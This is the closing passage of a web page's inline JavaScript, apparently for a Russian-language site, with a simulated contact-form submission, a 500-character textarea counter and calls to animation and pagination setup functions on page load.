            // Simulate form submission
            setTimeout(() => {
                alert('Сообщение отправлено! Мы свяжемся с вами скоро.');
                e.target.reset();
                document.querySelector('.char-counter').textContent = '0/500';
                document.querySelector('.char-counter').classList.remove('visible');
            }, 1000);
        });

        // Character counter for textarea
        document.querySelector('.contact-form textarea').addEventListener('input', function () {
            const counter = document.querySelector('.char-counter');
            const currentLength = this.value.length;
            counter.textContent = `${currentLength}/500`;
            
            if (currentLength > 0) {
                counter.classList.add('visible');
            } else {
                counter.classList.remove('visible');
            }
            
            if (currentLength >= 500) {
                counter.classList.add('limit-reached');
            } else {
                counter.classList.remove('limit-reached');
            }
        });

        // Initialize animations and functionality
        document.addEventListener('DOMContentLoaded', () => {
            animateFeatures();
            animateSteps();
            animateTestimonials();
            initPagination();
            generateRoomUsers();
        });
    </script>
</body>
</html>

